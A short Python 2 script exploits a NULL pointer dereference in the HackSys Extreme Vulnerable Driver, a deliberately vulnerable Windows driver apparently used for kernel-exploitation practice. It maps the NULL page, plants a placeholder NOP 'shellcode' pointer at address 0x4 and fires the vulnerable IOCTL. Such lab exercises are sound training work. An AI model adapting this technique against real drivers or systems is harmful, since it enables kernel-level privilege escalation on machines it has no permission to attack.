import ctypes, sys, struct
from ctypes import *
from subprocess import *
 
def main():
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice or hevDevice == -1:
        print "*** Couldn't get Device Driver handle"
        sys.exit(-1)
 
    shellcode = id("\x90" * 4) + 20
 
    null_status = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
    if null_status != 0x0:
            print "\t[+] Failed to allocate NULL page..."
            sys.exit(-1)
    else:
            print "\t[+] NULL Page Allocated"
 
    if not kernel32.WriteProcessMemory(0xFFFFFFFF, 0x4, shellcode, 0x40, byref(c_ulong())):
            print "\t[+] Failed to write at 0x4 location"
            sys.exit(-1)
 
    buf = '\x37\x13\xd3\xba'
    bufLength = len(buf)
 
    kernel32.DeviceIoControl(hevDevice, 0x22202b, buf, bufLength, None, 0, byref(c_ulong()), None)
 
if __name__ == "__main__":
    main()